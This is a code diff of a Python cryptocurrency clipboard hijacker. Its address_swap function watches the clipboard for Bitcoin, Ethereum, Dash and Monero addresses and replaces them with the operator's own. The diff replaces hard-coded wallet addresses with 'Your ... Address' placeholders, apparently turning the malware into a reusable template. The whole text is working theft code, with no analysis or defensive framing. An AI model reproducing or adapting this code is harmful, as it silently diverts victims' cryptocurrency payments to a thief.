@@ -27,20 +27,20 @@ def address_swap():
     try:
         clipboard_data = pyperclip.paste()
         if re.search('^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$', clipboard_data):
-            pyperclip.copy('1HzieRU9oWQeiiYABie6PDtAjrZawd7a6d')
+            pyperclip.copy('Your BTC Address')
             pyperclip.paste()
 
         if re.search('^0x[a-fA-F0-9]{40}$', clipboard_data):
-            pyperclip.copy('0x658be041b415298a78744813f0c0b6e49345153d')
+            pyperclip.copy('Your ETH Address')
             pyperclip.paste()
             
         
         if re.search('X[1-9A-HJ-NP-Za-km-z]{33}$', clipboard_data):
-            pyperclip.copy('Xste7BvQgLX5Wrq2Kw5fSDQEeMcRcYamnL')
+            pyperclip.copy('Your DASH Address')
             pyperclip.paste()
         
         if re.search('4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$', clipboard_data):
-            pyperclip.copy('85aF94FdNHrFFbgnuKnpQfJSLL7HYQqVJaKfoJ8CgWSeLh7PfaNAFy3NxzQ69xrNWLCJVHjExXxQwc4Du5kaYRH81qcKdPD')
+            pyperclip.copy('Your XMR Address')
             pyperclip.paste()
 
     except:
